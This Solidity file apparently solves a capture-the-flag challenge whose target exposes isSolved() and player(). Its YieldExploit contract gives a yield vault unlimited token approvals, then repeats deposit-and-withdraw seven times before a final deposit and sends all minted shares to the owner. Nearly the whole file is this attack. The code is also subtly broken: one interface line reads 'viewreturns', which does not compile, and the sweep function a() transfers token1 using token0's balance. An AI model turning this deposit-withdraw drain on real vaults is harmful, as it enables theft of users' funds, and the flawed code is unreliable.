// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IYield {

    function isSolved() external view returns (bool);
    function pool() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function tickSpacing() external view returns (int24);
    function protocolFee() external view returns (uint256);
    function maxTotalSupply() external view returns (uint256);
    function governance() external view returns (address);
    function lastTick() external view returns (int24);
    function baseLower() external view returns (int24);
    function baseUpper() external view returns (int24);
    function player() external view returns (address);
    
    function deposit(
        uint256 amount0Desired,
        uint256 amount1Desired,
        uint256 amount0Min,
        uint256 amount1Min,
        address to
    ) external returns (uint256 shares, uint256 amount0, uint256 amount1);

    function withdraw(
        uint256 shares,
        uint256 amount0Min,
        uint256 amount1Min,
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function rebalance() external;

    function getTotalAmounts() external view returns (uint256 total0, uint256 total1);
    
    function getPositionAmounts(int24 tickLower, int24 tickUpper) external viewreturns (uint256 amount0, uint256 amount1);
    
    function getBalance0() external view returns (uint256);
    function getBalance1() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract YieldExploit {
    address public owner;
    IYield public yieldContract;
    IERC20 public token0;
    IERC20 public token1;

    event Deposit(
        uint256 shares,
        uint256 amount0,
        uint256 amount1
    );

    event Withdraw(
        uint256 shares,
        uint256 amount0,
        uint256 amount1
    );
    
    constructor(address _yield, address _token0, address _token1) {
        owner = msg.sender;
        yieldContract = IYield(_yield);
        token0 = IERC20(_token0);
        token1 = IERC20(_token1);
    }
    
    function exploit() external {
        require(msg.sender == owner, "Not owner");
        
        token0.approve(address(yieldContract), type(uint256).max);
        token1.approve(address(yieldContract), type(uint256).max);
        
        uint256 initialBalance0 = token0.balanceOf(address(this));
        uint256 initialBalance1 = token1.balanceOf(address(this));

        uint256 lastShares = 0;
        
        for (uint i = 0; i < 7; i++) {
            (uint256 shares,,) = yieldContract.deposit(
                initialBalance0,  // 5e18 token0
                initialBalance1,  // 5e18 token1
                1,
                1,
                address(this)
            );

            emit Deposit(shares, initialBalance0, initialBalance1);
            
            yieldContract.withdraw(
                shares,
                0,
                0,
                address(this)
            );

            initialBalance0 = token0.balanceOf(address(this));
            initialBalance1 = token1.balanceOf(address(this));

            emit Withdraw(shares, token0.balanceOf(address(this)), token1.balanceOf(address(this)));

            lastShares = shares;
        }
        
        (uint256 shares,,) = yieldContract.deposit(
            initialBalance0,  
            initialBalance1,  
            1,
            1,
            address(this)
        );

        emit Deposit(shares, initialBalance0, initialBalance1);
        IERC20(address(yieldContract)).transfer(owner, IERC20(address(yieldContract)).balanceOf(address(this)));
    }

    function a() public {
        token0.transfer(owner, token0.balanceOf(address(this)));
        token1.transfer(owner, token0.balanceOf(address(this)));
    }
}